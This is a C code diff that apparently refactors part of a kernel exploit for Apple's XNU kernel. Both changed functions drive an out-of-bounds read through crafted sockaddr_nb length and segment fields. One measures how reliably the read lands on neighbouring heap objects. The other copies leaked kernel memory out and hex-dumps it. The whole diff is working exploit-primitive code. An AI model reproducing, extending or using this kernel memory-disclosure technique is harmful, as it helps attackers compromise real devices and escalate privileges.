@@ -75,14 +75,26 @@ double kmem_zkext_neighbor_reader_check(kmem_zkext_neighour_reader_t reader, uin
     uint8_t to_read = total_size - offsetof(struct sockaddr_nb, snb_name) - 6;
     xe_assert_cond(total_size, <=, UINT8_MAX);
     
-    char* buffer = malloc(2048);
+    uint32_t* local_nb_name_size = alloca(sizeof(uint32_t));
+    *local_nb_name_size = 2048;
+    char* local_nb_name = malloc(*local_nb_name_size);
     int num_hits = 0;
     
     for (int i=0; i<NUM_SAMPLES_FOR_PROBABILITY; i++) {
         dispatch_semaphore_t sem = dispatch_semaphore_create(0);
         
         dispatch_async(xe_dispatch_queue(), ^() {
-            kmem_neighbor_reader_read(&reader->smb_addr, sizeof(struct sockaddr_nb), sizeof(struct sockaddr_nb), sizeof(struct sockaddr_nb), 64, zone_size, to_read, buffer, 2048);
+            struct kmem_neighbor_reader_args params;
+            params.smb_addr = reader->smb_addr;
+            params.saddr_snb_len = sizeof(struct sockaddr_nb);
+            params.saddr_ioc_len = sizeof(struct sockaddr_nb);
+            params.saddr_snb_name_seglen = 3;
+            static_assert(sizeof(struct sockaddr_nb) > 48 && sizeof(struct sockaddr_nb) <= 64, "");
+            params.laddr_snb_len = 64;
+            params.laddr_ioc_len = zone_size;
+            params.laddr_snb_name_seglen = to_read;
+            
+            kmem_neighbor_reader_read(&params, NULL, NULL, local_nb_name, local_nb_name_size);
             dispatch_semaphore_signal(sem);
         });
         
@@ -91,10 +103,9 @@ double kmem_zkext_neighbor_reader_check(kmem_zkext_neighour_reader_t reader, uin
             continue;
         }
         
-        uint32_t total_bytes_read = *((uint32_t*)buffer);
-        xe_assert_cond(total_bytes_read, >=, to_read + 1);
+        xe_assert_cond(*local_nb_name_size, >=, to_read + 1);
         
-        uint8_t first_segment_size = buffer[4];
+        uint8_t first_segment_size = local_nb_name[0];
         xe_assert_cond(first_segment_size, ==, to_read);
         
         int bytes_to_skip = 64 - offsetof(struct sockaddr_nb, snb_name);
@@ -102,7 +113,7 @@ double kmem_zkext_neighbor_reader_check(kmem_zkext_neighour_reader_t reader, uin
         _Bool is_hit = TRUE;
         for (int i=0; i<num_overwritten; i++) {
             struct sockaddr_un un;
-            memcpy(&un, &buffer[4 + bytes_to_skip + i * 64], sizeof(struct sockaddr_un));
+            memcpy(&un, &local_nb_name[bytes_to_skip + i * 64], sizeof(struct sockaddr_un));
             if (un.sun_len != 64 || un.sun_family != AF_LOCAL) {
                 is_hit = FALSE;
                 break;
@@ -114,7 +125,7 @@ double kmem_zkext_neighbor_reader_check(kmem_zkext_neighour_reader_t reader, uin
         }
     }
     
-    free(buffer);
+    free(local_nb_name);
     return (double)num_hits / (double)NUM_SAMPLES_FOR_PROBABILITY;
 }
 
@@ -137,21 +148,32 @@ int kmem_zkext_neighbor_reader_read(kmem_zkext_neighour_reader_t reader, uint8_t
             continue;
         }
         
-        char* buffer = malloc(2048);
-        uint8_t snb_name = zone_size + zone_size - offsetof(struct sockaddr_nb, snb_name) + 2;
+        uint32_t local_nb_name_size = 2048;
+        char* local_nb_name = malloc(local_nb_name_size);
+                
+        uint8_t snb_name_seglen = zone_size + zone_size - offsetof(struct sockaddr_nb, snb_name) + 2;
+        
+        struct kmem_neighbor_reader_args params;
+        params.smb_addr = reader->smb_addr;
+        params.saddr_snb_len = sizeof(struct sockaddr_nb);
+        params.saddr_ioc_len = sizeof(struct sockaddr_nb);
+        params.saddr_snb_name_seglen = 3;
+        params.laddr_snb_len = zone_size * 2;
+        params.laddr_ioc_len = zone_size;
+        params.laddr_snb_name_seglen = snb_name_seglen;
+        
+        kmem_neighbor_reader_read(&params, NULL, NULL, local_nb_name, &local_nb_name_size);
+        
+        xe_assert_cond(local_nb_name_size, >=, snb_name_seglen);
+        
+        uint8_t first_segment_len = local_nb_name[0];
+        xe_assert_cond(first_segment_len, ==, snb_name_seglen);
+        
         int bytes_to_skip = zone_size - offsetof(struct sockaddr_nb, snb_name);
+        xe_util_binary_hex_dump(&local_nb_name[bytes_to_skip], data_size);
+        memcpy(data, &local_nb_name[bytes_to_skip], data_size);
         
-        kmem_neighbor_reader_read(&reader->smb_addr, sizeof(struct sockaddr_nb), sizeof(struct sockaddr_nb), sizeof(struct sockaddr_nb), zone_size * 2, zone_size, snb_name, buffer, 2048);
-        
-        uint32_t total_bytes_read = *((uint32_t*)buffer);
-        xe_assert_cond(total_bytes_read, >=, snb_name);
-        
-        uint8_t first_segment_len = buffer[4];
-        xe_assert_cond(first_segment_len, ==, snb_name);
-        
-        memcpy(data, &buffer[4 + bytes_to_skip], data_size);
-        
-        free(buffer);
+        free(local_nb_name);
         goto done;
     }
     
